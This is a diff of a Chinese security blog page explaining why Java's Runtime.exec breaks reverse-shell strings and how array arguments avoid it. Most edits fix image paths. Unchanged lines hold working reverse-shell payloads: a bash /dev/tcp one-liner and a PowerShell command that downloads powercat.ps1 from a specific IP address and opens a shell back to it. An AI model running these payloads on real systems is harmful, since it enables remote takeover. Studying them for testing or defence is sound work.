@@ -324,11 +324,11 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>Runtime执行命令时，最终都会调用到<code>public Process exec(String[] cmdarray, String[] envp, File dir)</code>，而exec里面经过函数<code>StringTokenizer</code>进行分割，java 默认的分隔符是空格(“”)、制表符(\t)、换行符(\n)、回车符(\r)。所以导致了<code>Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;);</code>不能正常进行反弹shell</p>
-<p><img src="/%5Cimages%5Cposts%5CRuntime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell%5Cimage-20241109160625575.png"></p>
-<p><img src="/%5Cimages%5Cposts%5CRuntime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell%5Cimage-20241109160738289.png"></p>
+<p><img src="/images/posts/Runtime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell/image-20241109160625575.png"></p>
+<p><img src="/images/posts/Runtime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell/image-20241109160738289.png"></p>
 <p>这里的<code>cmdarray</code>就不再是我们传入的命令了，就不能正常反弹shell</p>
-<p><img src="/%5Cimages%5Cposts%5CRuntime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell%5Cimage-20241109160459700.png"></p>
-<p><img src="/%5Cimages%5Cposts%5CRuntime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell%5Cimage-20241109161024325.png"></p>
+<p><img src="/images/posts/Runtime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell/image-20241109160459700.png"></p>
+<p><img src="/images/posts/Runtime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell/image-20241109161024325.png"></p>
 <h2 id="数组传参"><a href="#数组传参" class="headerlink" title="数组传参"></a>数组传参</h2><p>exec支持数组传参，所以正常进行反弹shell可以用数组进行传参</p>
 <pre class="language-dart" data-language="dart"><code class="language-dart"><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string-literal"><span class="token string">"bash"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"-c"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"bash -i >&amp; /dev/tcp/ip/post 0>&amp;1"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 
@@ -396,7 +396,7 @@ public class EXP &#123;
 <pre class="language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'http://47.116.120.205:6666/powercat.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> powercat <span class="token operator">-</span>c 47<span class="token punctuation">.</span>116<span class="token punctuation">.</span>120<span class="token punctuation">.</span>205 <span class="token operator">-</span>p 5566 <span class="token operator">-</span>e cmd</code></pre>
 
 <p><a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">powercat.ps1</a></p>
-<p><img src="/%5Cimages%5Cposts%5CRuntime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell%5Cimage-20241109164539193.png"></p>
+<p><img src="/images/posts/Runtime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell/image-20241109164539193.png"></p>
 
                 
             </div>
@@ -788,7 +788,7 @@ public class EXP &#123;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">50k</span>
+                        class="white-color">50.3k</span>
             
             
             
